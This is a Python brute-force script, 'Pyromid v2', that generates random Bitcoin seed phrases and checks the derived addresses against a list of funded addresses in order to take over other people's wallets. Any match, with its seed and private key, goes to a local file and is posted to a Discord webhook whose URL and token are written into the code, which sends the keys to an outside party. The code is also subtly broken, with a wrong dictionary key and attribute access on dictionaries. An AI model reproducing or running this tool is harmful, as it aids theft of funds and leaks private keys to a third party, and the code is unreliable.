# install cryptofuzz & colorthon
# pip install cryptofuzz / pip install colorthon
import os, random, time, threading
from colorthon import Colors
from multiprocessing import Pool
import multiprocessing
from hdwallet import HDWallet
from hdwallet.symbols import BTC as SYMBOL
from hdwallet.utils import generate_mnemonic
import requests

threads = 10
cores = 8

# COLORS CODE --------------------
RED = Colors.RED
GREEN = Colors.GREEN
YELLOW = Colors.YELLOW
CYAN = Colors.CYAN
WHITE = Colors.WHITE
RESET = Colors.RESET
# COLORS CODE -------------------

def generate_wallets():
	wallets = []
	addresses = []

	for r in range(threads):
		seed = generate_mnemonic()
		hdwallet: HDWallet = HDWallet(symbol = SYMBOL)
		hdwallet.from_mnemonic(mnemonic = seed)
		priv = hdwallet.private_key()

		addr1 = hdwallet.p2wsh_address()
		addr2 = hdwallet.p2pkh_address()
		addr3 = hdwallet.p2wpkh_address()
		addr4 = hdwallet.p2sh_address()

		addresses.append(addr1)
		addresses.append(addr2)
		addresses.append(addr3)
		addresses.append(addr4)

		wallets.append({"seed": seed, "address": addr1, "private_key": priv})
		wallets.append({"seed": seed, "address": addr2, "private_key": priv})
		wallets.append({"seed": seed, "address": addr3, "private_key": priv})
		wallets.append({"seed": seed, "address": addr4, "private_key": priv})

	return {
		'addresses': set(addresses),
		'wallets': wallets
	}

def getClear():
	if os.name == 'nt':
		os.system('cls')
	else:
		os.system('clear')

def Rich_Loader(FileName):
	return set([i.strip() for i in open(FileName).readlines()])

def getHeader(richFile, loads, found):
	getClear()
	output = f"""
{YELLOW}\t██████╗ ██╗   ██╗██████╗  ██████╗ ███╗   ███╗██╗██████╗ {RESET}
{YELLOW}\t██╔══██╗╚██╗ ██╔╝██╔══██╗██╔═══██╗████╗ ████║██║██╔══██╗{RESET}
{YELLOW}\t██████╔╝ ╚████╔╝ ██████╔╝██║   ██║██╔████╔██║██║██║  ██║{RESET}
{YELLOW}\t██╔═══╝   ╚██╔╝  ██╔══██╗██║   ██║██║╚██╔╝██║██║██║  ██║{RESET}
{YELLOW}\t██║        ██║   ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║██████╔╝{RESET}
{YELLOW}\t╚═╝        ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝╚═════╝ {RESET}
{RED}╔═╗╦═╗╔═╗╔═╗╦═╗╔═╗╔╦╗╔╦╗╔═╗╦═╗{RESET}  {WHITE}╔╦╗╔╦╗╔╦╗╦═╗╔═╗╔═╗ ╔═╗╔═╗╔╦╗{RESET}
{RED}╠═╝╠╦╝║ ║║ ╦╠╦╝╠═╣║║║║║║║╣ ╠╦╝{RESET}  {WHITE}║║║║║║ ║║╠╦╝╔═╝╠═╣ ║  ║ ║║║║{RESET}
{RED}╩  ╩╚═╚═╝╚═╝╩╚═╩ ╩╩ ╩╩ ╩╚═╝╩╚═{RESET}  {WHITE}╩ ╩╩ ╩═╩╝╩╚═╚═╝╩ ╩o╚═╝╚═╝╩ ╩{RESET}
{RED}➜{RESET} {WHITE}Pyromid {RESET}{CYAN}v2 {RESET}Ⓟ{GREEN} Powered By CryptoFuzz - Exclusive MMDRZA.COM{RESET}
{RED}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{RESET}
{RED}[{RESET}{WHITE}►{RESET}{RED}]{RESET}{GREEN} Import Rich File :{RESET}{CYAN} {richFile}                {RESET}
{RED}[{RESET}{WHITE}►{RESET}{RED}]{RESET}{GREEN} Method Generated :{RESET}{CYAN} Random Without Repeat.    {RESET}
{RED}[{RESET}{WHITE}►{RESET}{RED}]{RESET}{GREEN} Address Type     :{RESET}{CYAN} P2PKH                     {RESET}
{RED}[{RESET}{WHITE}►{RESET}{RED}]{RESET}{GREEN} Result Checked   :{RESET}{CYAN} {loads}                   {RESET}
{RED}[{RESET}{WHITE}►{RESET}{RED}]{RESET}{GREEN} Matched Address  :{RESET}{CYAN} {found}                   {RESET}
"""
	print(output)

def message(title, message):
	embered = { 'title': message }
	headers = { "Content-Type": "application/json" }
	data = {'username': 'doge-scan-bot', 'avatar_url': 'https://i.imgur.com/AfFp7pu.png', 'content': str(title), 'embeds': [embered]}
	webhook_url = "https://discord.com/api/webhooks/1227910695769870446/HZIb6qMoD8V3Fu8RMCsMwLp8MnGouLuVveDKA2eA1tNPUMWU-itneoAayVXFcC3EVlwK"
	requests.post(webhook_url, json=data, headers=headers)

def get_balance(address):
	try:
		response = requests.get(f"https://bitcoin.atomicwallet.io/api/v2/address/{address}")
		data = response.json()
		balance = int(data.get('balance', 0))  / 100000000
		return balance
	except Exception as error:
		print('Error: ', error)
		return 0

def MainCheck():
	global z, wf
	target_file = 'Bitcoin_addresses_LATEST.txt'
	Targets = Rich_Loader(target_file)
	z = 0
	wf = 0
	lg = 0
	getHeader(richFile=target_file, loads=lg, found=wf)
	while True:
		z += threads

		gwallets = generate_wallets()
		addresses = gwallets.get('addresses')
		wallets = gwallets.get('wallet')

		lct = time.localtime()
		matched = Targets.intersection(addresses);

		if len(matched) > 0:
			addrs = [wallet for wallet in wallets if wallet["address"] in matched]
			for ck in addrs:
				wf += 1
				balance = get_balance(ck.address)

				message('NEW BTC WALLET IS FOUND!', f"[{balance} BTC] \n Address: [{ck.address}] \n Seed: [{ck.seed}] \n Private: [{ck.private_key}]")

				open('Found.txt', 'a').write(f"Address: {ck.address}\n"
											f"Private Key: {ck.private_key}\n"
											f"Seed: {ck.seed}\n"
											f"Balance: {balance} BTC\n"
											f"{'-' * 66}\n")
		elif int(z % 100000) == 0:
			lg += 100000
			getHeader(richFile=target_file, loads=lg, found=wf)
			print(f"Generated: {lg} (SHA-256 - HEX) ...")
		else:
			tm = time.strftime("%Y-%m-%d %H:%M:%S", lct)
			print(f"[{tm}][Total: {z} Check: {z * cores}] #Found: {wf}", end="\r")


# MainCheck()

if __name__ == '__main__':
	for i in range(cores):
		p = multiprocessing.Process(target=MainCheck)
		p.start()
